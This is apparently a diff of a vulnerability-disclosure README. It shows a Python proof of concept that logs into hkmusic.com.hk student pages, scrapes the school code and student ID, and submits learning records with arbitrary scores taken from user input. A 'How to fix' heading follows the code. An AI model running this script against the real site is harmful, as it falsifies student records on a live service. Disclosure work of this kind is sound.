@@ -126,15 +126,15 @@ All records can be saved for teachers or students to keep track of the learning 
 <span class="pl-s1">totalScore</span> <span class="pl-c1">=</span> <span class="pl-en">input</span>(<span class="pl-s">"Enter total score: "</span>)
 
 <span class="pl-c"># Calculate correct percentage</span>
-<span class="pl-s1">correct_percent</span> <span class="pl-c1">=</span> <span class="pl-s1">math</span>.<span class="pl-en">ceil</span>((<span class="pl-en">int</span>(<span class="pl-s1">total_correct</span>) <span class="pl-c1">*</span> <span class="pl-c1">100</span>) <span class="pl-c1">/</span> (<span class="pl-en">int</span>(<span class="pl-s1">total_correct</span>) <span class="pl-c1">+</span> <span class="pl-en">int</span>(<span class="pl-s1">total_wrong</span>))) <span class="pl-k">if</span> (<span class="pl-en">int</span>(<span class="pl-s1">total_correct</span>) <span class="pl-c1">+</span> <span class="pl-en">int</span>(<span class="pl-s1">total_wrong</span>)) <span class="pl-c1">&gt;</span> <span class="pl-c1">0</span> <span class="pl-k">else</span> <span class="pl-c1">0</span>
+<span class="pl-s1">correct_percent</span> <span class="pl-c1">=</span> <span class="pl-s1">math</span>.<span class="pl-c1">ceil</span>((<span class="pl-en">int</span>(<span class="pl-s1">total_correct</span>) <span class="pl-c1">*</span> <span class="pl-c1">100</span>) <span class="pl-c1">/</span> (<span class="pl-en">int</span>(<span class="pl-s1">total_correct</span>) <span class="pl-c1">+</span> <span class="pl-en">int</span>(<span class="pl-s1">total_wrong</span>))) <span class="pl-k">if</span> (<span class="pl-en">int</span>(<span class="pl-s1">total_correct</span>) <span class="pl-c1">+</span> <span class="pl-en">int</span>(<span class="pl-s1">total_wrong</span>)) <span class="pl-c1">&gt;</span> <span class="pl-c1">0</span> <span class="pl-k">else</span> <span class="pl-c1">0</span>
 
 <span class="pl-c"># Fetching cookies</span>
 <span class="pl-s1">initial_url</span> <span class="pl-c1">=</span> <span class="pl-s">"https://www.hkmusic.com.hk"</span>
-<span class="pl-s1">session</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-v">Session</span>()
-<span class="pl-s1">session</span>.<span class="pl-en">get</span>(<span class="pl-s1">initial_url</span>)
+<span class="pl-s1">session</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">Session</span>()
+<span class="pl-s1">session</span>.<span class="pl-c1">get</span>(<span class="pl-s1">initial_url</span>)
 
 <span class="pl-c"># Get cookies from the session</span>
-<span class="pl-s1">cookies</span> <span class="pl-c1">=</span> <span class="pl-s1">session</span>.<span class="pl-s1">cookies</span>.<span class="pl-en">get_dict</span>()
+<span class="pl-s1">cookies</span> <span class="pl-c1">=</span> <span class="pl-s1">session</span>.<span class="pl-c1">cookies</span>.<span class="pl-c1">get_dict</span>()
 
 <span class="pl-c"># Login URL and payload</span>
 <span class="pl-s1">login_url</span> <span class="pl-c1">=</span> <span class="pl-s">"https://www.hkmusic.com.hk/web/student_pages/login/loginRegistered.asp"</span>
@@ -144,15 +144,15 @@ All records can be saved for teachers or students to keep track of the learning 
 }
 
 <span class="pl-c"># Perform login</span>
-<span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">session</span>.<span class="pl-en">post</span>(<span class="pl-s1">login_url</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">payload</span>, <span class="pl-s1">cookies</span><span class="pl-c1">=</span><span class="pl-s1">cookies</span>)
-<span class="pl-s1">response_text</span> <span class="pl-c1">=</span> <span class="pl-s1">response</span>.<span class="pl-s1">text</span>
+<span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">session</span>.<span class="pl-c1">post</span>(<span class="pl-s1">login_url</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">payload</span>, <span class="pl-s1">cookies</span><span class="pl-c1">=</span><span class="pl-s1">cookies</span>)
+<span class="pl-s1">response_text</span> <span class="pl-c1">=</span> <span class="pl-s1">response</span>.<span class="pl-c1">text</span>
 
 <span class="pl-c"># Extract school code and student ID using regex</span>
-<span class="pl-s1">school_code_match</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-en">search</span>(<span class="pl-s">r'&lt;input[^&gt;]+name="schoolCode"[^&gt;]+value="([^"]*)"'</span>, <span class="pl-s1">response_text</span>)
-<span class="pl-s1">student_id_match</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-en">search</span>(<span class="pl-s">r'&lt;input[^&gt;]+name="studentId"[^&gt;]+value="([^"]*)"'</span>, <span class="pl-s1">response_text</span>)
+<span class="pl-s1">school_code_match</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">search</span>(<span class="pl-s">r'&lt;input[^&gt;]+name="schoolCode"[^&gt;]+value="([^"]*)"'</span>, <span class="pl-s1">response_text</span>)
+<span class="pl-s1">student_id_match</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">search</span>(<span class="pl-s">r'&lt;input[^&gt;]+name="studentId"[^&gt;]+value="([^"]*)"'</span>, <span class="pl-s1">response_text</span>)
 
-<span class="pl-s1">school_code</span> <span class="pl-c1">=</span> <span class="pl-s1">school_code_match</span>.<span class="pl-en">group</span>(<span class="pl-c1">1</span>) <span class="pl-k">if</span> <span class="pl-s1">school_code_match</span> <span class="pl-k">else</span> <span class="pl-c1">None</span>
-<span class="pl-s1">student_id</span> <span class="pl-c1">=</span> <span class="pl-s1">student_id_match</span>.<span class="pl-en">group</span>(<span class="pl-c1">1</span>) <span class="pl-k">if</span> <span class="pl-s1">student_id_match</span> <span class="pl-k">else</span> <span class="pl-c1">None</span>
+<span class="pl-s1">school_code</span> <span class="pl-c1">=</span> <span class="pl-s1">school_code_match</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>) <span class="pl-k">if</span> <span class="pl-s1">school_code_match</span> <span class="pl-k">else</span> <span class="pl-c1">None</span>
+<span class="pl-s1">student_id</span> <span class="pl-c1">=</span> <span class="pl-s1">student_id_match</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>) <span class="pl-k">if</span> <span class="pl-s1">student_id_match</span> <span class="pl-k">else</span> <span class="pl-c1">None</span>
 
 <span class="pl-en">print</span>(<span class="pl-s">"School code:"</span>, <span class="pl-s1">school_code</span>)
 <span class="pl-en">print</span>(<span class="pl-s">"Student ID:"</span>, <span class="pl-s1">student_id</span>)
@@ -173,9 +173,9 @@ All records can be saved for teachers or students to keep track of the learning 
     }
 
     <span class="pl-c"># Submit the record</span>
-    <span class="pl-s1">record_response</span> <span class="pl-c1">=</span> <span class="pl-s1">session</span>.<span class="pl-en">get</span>(<span class="pl-s1">record_url</span>, <span class="pl-s1">params</span><span class="pl-c1">=</span><span class="pl-s1">params</span>)
-    <span class="pl-en">print</span>(<span class="pl-s">"Response Status Code:"</span>, <span class="pl-s1">record_response</span>.<span class="pl-s1">status_code</span>)
-    <span class="pl-en">print</span>(<span class="pl-s">"Response Content:"</span>, <span class="pl-s1">record_response</span>.<span class="pl-s1">text</span>)
+    <span class="pl-s1">record_response</span> <span class="pl-c1">=</span> <span class="pl-s1">session</span>.<span class="pl-c1">get</span>(<span class="pl-s1">record_url</span>, <span class="pl-s1">params</span><span class="pl-c1">=</span><span class="pl-s1">params</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">"Response Status Code:"</span>, <span class="pl-s1">record_response</span>.<span class="pl-c1">status_code</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">"Response Content:"</span>, <span class="pl-s1">record_response</span>.<span class="pl-c1">text</span>)
 <span class="pl-k">else</span>:
     <span class="pl-en">print</span>(<span class="pl-s">"Login failed or could not retrieve student info."</span>)</pre></div>
 <h2>How to fix the Vulnerability?</h2>
